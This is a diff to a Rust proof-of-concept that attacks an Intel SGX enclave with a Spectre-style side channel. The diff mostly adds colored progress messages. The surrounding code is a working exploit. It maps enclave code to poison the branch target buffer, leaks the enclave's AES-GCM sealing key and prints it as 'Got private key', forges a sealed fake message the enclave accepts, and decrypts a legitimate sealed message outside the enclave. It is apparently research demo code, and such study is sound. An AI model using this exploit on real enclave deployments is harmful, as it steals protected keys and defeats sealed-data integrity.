@@ -43,6 +43,9 @@ extern crate aes_gcm;
 use aes_gcm::aead::{generic_array::GenericArray, Aead, NewAead, Payload};
 use aes_gcm::Aes128Gcm;
 
+extern crate termcolor;
+use termcolor::{Color, ColorChoice, ColorSpec, StandardStream, WriteColor};
+
 static ENCLAVE_FILE: &'static str = "enclave1.signed.so";
 
 extern "C" {
@@ -101,16 +104,18 @@ fn main() -> std::io::Result<()> {
         sched_setaffinity(Pid::from_raw(0), &cpuset).unwrap();
     }
 
+    let mut stdout = StandardStream::stdout(ColorChoice::Always);
+
     unsafe {
         let tmp_enclave = match init_enclave() {
             Ok(r) => {
-                println!("[+] Init Enclave Successful: enclave ID is {}!", r.geteid());
+                println!("Init Enclave Successful: enclave ID is {}!", r.geteid());
                 r
             }
             Err(x) => {
                 return Err(std::io::Error::new(
                     std::io::ErrorKind::Other,
-                    format!("[-] Init Enclave Failed: {}!", x.as_str()),
+                    format!("Init Enclave Failed: {}!", x.as_str()),
                 ));
             }
         };
@@ -123,17 +128,21 @@ fn main() -> std::io::Result<()> {
         std::mem::forget(tmp_enclave);
     }
 
+    stdout.set_color(ColorSpec::new().set_fg(Some(Color::Green)))?;
+    println!("Retrieving the address of a symbol from the enclave");
+    stdout.set_color(ColorSpec::new().set_fg(Some(Color::White)))?;
+
     let mut secret_full_addr = 0;
 
     let result = unsafe { Enclave1_get_secret_addr(ENCLAVE.geteid(), &mut secret_full_addr) };
     if result != sgx_status_t::SGX_SUCCESS {
         return Err(std::io::Error::new(
             std::io::ErrorKind::Other,
-            format!("[-] ECALL Enclave Failed: {}!", result.as_str()),
+            format!("ECALL Enclave Failed: {}!", result.as_str()),
         ));
     }
 
-    println!("[+] Got addr 0x{:x}", secret_full_addr);
+    println!("Got addr 0x{:x}", secret_full_addr);
 
     let cs = Capstone::new()
         .x86()
@@ -142,6 +151,10 @@ fn main() -> std::io::Result<()> {
         .detail(true)
         .build()
         .expect("Failed to create Capstone object");
+
+    stdout.set_color(ColorSpec::new().set_fg(Some(Color::Green)))?;
+    println!("Parsing the enclave file");
+    stdout.set_color(ColorSpec::new().set_fg(Some(Color::White)))?;
 
     // read the file, parse the elf, and extract the code of the targetted function (+ perform the
     // relocation to take care of the layout randomisation)
@@ -211,6 +224,10 @@ fn main() -> std::io::Result<()> {
         }
     }
 
+    stdout.set_color(ColorSpec::new().set_fg(Some(Color::Green)))?;
+    println!("Remapping training code to clobber the BTB");
+    stdout.set_color(ColorSpec::new().set_fg(Some(Color::White)))?;
+
     println!(
         "access_memory_spectre_offset: 0x{:x}",
         access_memory_spectre_offset
@@ -260,6 +277,14 @@ fn main() -> std::io::Result<()> {
         + mapped_array as *const _ as usize
         + spectre_limit_sym.st_value as usize;
     println!("spectre_limit_addr: 0x{:x}", spectre_limit_addr);
+
+    let minidow_secret_array_addr_in_enclave = minidow_secret_array_rela_addr as i64
+        + mapped_array as *const _ as i64
+        + top_32bit_offset as i64;
+    println!(
+        "Minidow_secret adress inside the enclave: 0x{:x}",
+        minidow_secret_array_addr_in_enclave
+    );
 
     let spectre_test_training_fun: unsafe extern "C" fn(
         measurement_array_addr: usize,
@@ -322,6 +347,10 @@ fn main() -> std::io::Result<()> {
         std::mem::transmute(&mapped_array[spectre_test_offset])
     };
 
+    stdout.set_color(ColorSpec::new().set_fg(Some(Color::Green)))?;
+    println!("Setting up an environment for exploiting spectre");
+    stdout.set_color(ColorSpec::new().set_fg(Some(Color::White)))?;
+
     setup_measurements();
     // yay, training is now possible!
 
@@ -329,7 +358,7 @@ fn main() -> std::io::Result<()> {
         //*((base_addr + minidow::MULTIPLE_OFFSET) as *mut u8) = 123;
         let result = Enclave1_spectre_test(ENCLAVE.geteid(), base_addr as u64, off as u64);
         if result != sgx_status_t::SGX_SUCCESS {
-            println!("[-] ECALL Enclave Failed: {}!", result.as_str());
+            println!("ECALL Enclave Failed: {}!", result.as_str());
         }
     }
 
@@ -338,17 +367,9 @@ fn main() -> std::io::Result<()> {
     if result != sgx_status_t::SGX_SUCCESS {
         return Err(std::io::Error::new(
             std::io::ErrorKind::Other,
-            format!("[-] ECALL Enclave Failed: {}!", result.as_str()),
+            format!("ECALL Enclave Failed: {}!", result.as_str()),
         ));
     }
-
-    let minidow_secret_array_addr_in_enclave = minidow_secret_array_rela_addr as i64
-        + mapped_array as *const _ as i64
-        + top_32bit_offset as i64;
-    println!(
-        "Minidow_secret adress inside the enclave: 0x{:x}",
-        minidow_secret_array_addr_in_enclave
-    );
 
     let message = "Do Not Go Gentle Into That Good Night00000000000".as_bytes();
     let mut sealed_message = vec![0; 512];
@@ -370,7 +391,7 @@ fn main() -> std::io::Result<()> {
     if result != sgx_status_t::SGX_SUCCESS {
         return Err(std::io::Error::new(
             std::io::ErrorKind::Other,
-            format!("[-] ECALL Enclave Failed: {}!", result.as_str()),
+            format!("ECALL Enclave Failed: {}!", result.as_str()),
         ));
     }
     println!("AES-GCM encryption: {}", status);
@@ -405,7 +426,9 @@ fn main() -> std::io::Result<()> {
     );
 
     let pkey_val = ((key_part_2 as u128) << 64) | key_part_1 as u128;
+    stdout.set_color(ColorSpec::new().set_fg(Some(Color::Red)))?;
     println!("Got private key: 0x{:x}", pkey_val);
+    stdout.set_color(ColorSpec::new().set_fg(Some(Color::White)))?;
 
     let mut res_message = vec![0; 512];
 
@@ -417,7 +440,9 @@ fn main() -> std::io::Result<()> {
     let pkey = GenericArray::from(unsafe { std::mem::transmute::<u128, [u8; 16]>(pkey_val) });
     let cipher = Aes128Gcm::new(&pkey);
 
-    println!("SEALING A FAKE MESSAGE");
+    stdout.set_color(ColorSpec::new().set_fg(Some(Color::Green)))?;
+    println!("Sealing a fake message");
+    stdout.set_color(ColorSpec::new().set_fg(Some(Color::White)))?;
 
     let fake_message = b"fake message !!!";
     let payload = Payload {
@@ -447,16 +472,19 @@ fn main() -> std::io::Result<()> {
     if result != sgx_status_t::SGX_SUCCESS {
         return Err(std::io::Error::new(
             std::io::ErrorKind::Other,
-            format!("[-] ECALL Enclave Failed: {}!", result.as_str()),
+            format!("ECALL Enclave Failed: {}!", result.as_str()),
         ));
     }
     println!("unsealing by enclave: {}", status);
 
+    stdout.set_color(ColorSpec::new().set_fg(Some(Color::Red)))?;
     println!("Deciphered by the enclave: {}", unsafe {
         String::from_utf8_unchecked(res_message)
     });
 
-    println!("UNSEALING A MESSAGE");
+    stdout.set_color(ColorSpec::new().set_fg(Some(Color::Green)))?;
+    println!("Unsealing a legitimate message");
+    stdout.set_color(ColorSpec::new().set_fg(Some(Color::White)))?;
 
     let mut sealed_message_owned = sealed_message
         [0..sealed_message_len as usize - std::mem::size_of::<sgx_types::sgx_key_id_t>()]
@@ -468,6 +496,7 @@ fn main() -> std::io::Result<()> {
     };
     let deciphered = cipher.decrypt(nonce, payload).unwrap();
 
+    stdout.set_color(ColorSpec::new().set_fg(Some(Color::Red)))?;
     println!("Deciphered by the app: {}", unsafe {
         String::from_utf8_unchecked(deciphered)
     });
